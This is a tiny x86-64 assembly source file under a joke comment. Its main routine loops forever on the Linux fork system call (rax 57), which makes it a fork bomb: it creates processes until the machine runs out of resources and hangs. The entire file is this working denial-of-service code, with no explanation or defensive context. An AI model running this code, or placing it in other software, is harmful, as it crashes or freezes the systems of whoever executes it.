;BURPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
section .text
    extern printf
    global main
main:
loop:
    mov rax,57 
    xor rdi,rdi
    syscall
    jmp loop
